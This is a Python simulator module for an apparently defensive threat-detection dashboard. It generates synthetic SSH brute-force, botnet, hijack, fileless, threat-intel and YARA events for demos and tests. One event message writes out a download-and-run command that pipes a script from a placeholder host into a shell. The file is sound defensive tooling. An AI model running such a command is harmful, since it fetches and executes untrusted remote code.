"""Colector de simulación: genera ataques sintéticos para demo/tests.

Permite ver el dashboard y la correlación funcionando sin root, sin scapy y
sin un servidor real bajo ataque. Útil en desarrollo (Windows incluido).
"""
from __future__ import annotations

import asyncio
import random

from ..core import Severity, ThreatEvent
from .base import Collector

_USERS = ["root", "admin", "ubuntu", "pi", "postgres", "test", "git", "oracle"]
_MACS = ["00:1a:2b:3c:4d:5e", "ac:de:48:00:11:22", "f0:9f:c2:aa:bb:cc"]


class SimulatorCollector(Collector):
    name = "simulator"

    def __init__(self, bus, rate: float = 0.3) -> None:
        super().__init__(bus)
        self.rate = rate
        # "Atacantes" persistentes para que la correlación escale. Se usan IPs
        # públicas (no rangos de documentación, que Python clasifica como
        # privados) para que la respuesta activa sea representativa en la demo.
        # Una IP de LAN incluida para demostrar que NUNCA se bloquea la red local.
        # NOTA: --respond-live está bloqueado junto a --simulate por seguridad.
        self.attackers = ["45.135.232.17", "185.234.219.84", "192.168.1.66"]
        # "Botnet" de 7 IPs que comparten un mismo diccionario de usuarios: sirve
        # para que la atribución de actor entre IPs (clustering) se vea en la demo.
        self.botnet = [f"77.90.{i}.{(i * 37) % 254 + 1}" for i in range(7)]
        self.botnet_dict = ["root", "admin", "oracle", "postgres", "deploy"]

    async def run(self) -> None:
        while True:
            await asyncio.sleep(self.rate)
            # ~40% del tráfico es la botnet low-and-slow con diccionario
            # compartido (visible rápido en el panel de atribución de la demo).
            if random.random() < 0.4:
                await self.emit(ThreatEvent(
                    kind="login_fail", src_ip=random.choice(self.botnet),
                    user=random.choice(self.botnet_dict),
                    src_port=random.randint(30000, 60000), severity=Severity.LOW,
                    message="Fallo de contraseña (sim botnet)",
                    tags={"auth", "ssh"}))
                continue
            ip = random.choice(self.attackers)
            roll = random.random()
            if roll < 0.6:
                ev = ThreatEvent(
                    kind="login_fail", src_ip=ip, user=random.choice(_USERS),
                    src_port=random.randint(30000, 60000), severity=Severity.LOW,
                    message="Fallo de contraseña (sim)", tags={"auth", "ssh"},
                )
            elif roll < 0.8:
                ev = ThreatEvent(
                    kind="login_invalid_user", src_ip=ip,
                    user=random.choice(_USERS), severity=Severity.MEDIUM,
                    message="Usuario inexistente (sim)", tags={"auth", "recon"},
                )
            elif roll < 0.88:
                ev = ThreatEvent(
                    kind="tcp_syn", src_ip=ip, dst_port=random.randint(1, 9000),
                    mac=random.choice(_MACS) if ip.startswith("192.168") else None,
                    severity=Severity.INFO, message="SYN (sim)", tags={"l3"},
                )
            elif roll < 0.93:
                # Hijack sintético: LD_PRELOAD apuntando a /tmp.
                ev = ThreatEvent(
                    kind="hijack_preload", severity=Severity.CRITICAL,
                    message=f"LD_PRELOAD desde directorio efímero: "
                            f"/tmp/.rk_{random.randint(1000, 9999)}.so (sim)",
                    tags={"hijack", "ld_preload", "T1574.006"})
            elif roll < 0.95:
                ev = ThreatEvent(
                    kind="hijack_ptrace", severity=Severity.HIGH,
                    message=f"ptrace activo: '{random.choice(['python3','curl','nc'])}'"
                            f" rastrea 'sshd' (sim)",
                    tags={"hijack", "ptrace", "T1055.008"})
            elif roll < 0.97:
                # EdgeWatch sintético: hijack de navegador o fileless.
                ev = random.choice([
                    ThreatEvent(
                        kind="edge_hijack_extension", severity=Severity.CRITICAL,
                        message="extensión 'srch_helper' combina webRequest+"
                                "cookies+<all_urls> (patrón de infostealer) (sim)",
                        tags={"edge", "browser_hijack", "T1176"}),
                    ThreatEvent(
                        kind="edge_fileless", severity=Severity.CRITICAL,
                        message=f"ejecución desde memfd_create "
                                f"(/memfd:x (deleted), pid "
                                f"{random.randint(2000, 30000)}) (sim)",
                        tags={"edge", "fileless", "T1620"}),
                    ThreatEvent(
                        kind="edge_lolbin", severity=Severity.HIGH,
                        message="descarga-y-ejecuta (curl|sh) en pid "
                                f"{random.randint(2000, 30000)}: curl -fsSL "
                                "http://evil.example/x.sh | sh (sim)",
                        tags={"edge", "lolbin", "T1059"}),
                ])
            elif roll < 0.978:
                # Threat intel: la IP atacante está en un feed de C2 conocido.
                ev = ThreatEvent(
                    kind="threat_intel_hit", src_ip=ip, severity=Severity.HIGH,
                    message=f"IP {ip} en blocklist C2/botnet "
                            f"({random.choice(['feodo', 'sslbl'])}) (sim)",
                    tags={"threat-intel", "c2"})
            elif roll < 0.985:
                ev = ThreatEvent(
                    kind="yara_match", severity=Severity.CRITICAL,
                    message=random.choice([
                        "YARA 'Reverse_Shell_OneLiner' en "
                        f"/tmp/.x{random.randint(100,999)} (sim)",
                        "YARA 'PHP_Webshell' — eval de entrada del cliente "
                        "en /dev/shm/up.php (sim)",
                        "YARA 'Crypto_Miner_Config' — stratum+tcp en "
                        f"/tmp/cfg{random.randint(10,99)}.json (sim)",
                    ]),
                    tags={"yara", "signature"})
            else:
                ev = ThreatEvent(
                    kind="login_success", src_ip=ip, user="admin",
                    severity=Severity.INFO, message="Login exitoso (sim)",
                    tags={"auth"},
                )
            await self.emit(ev)
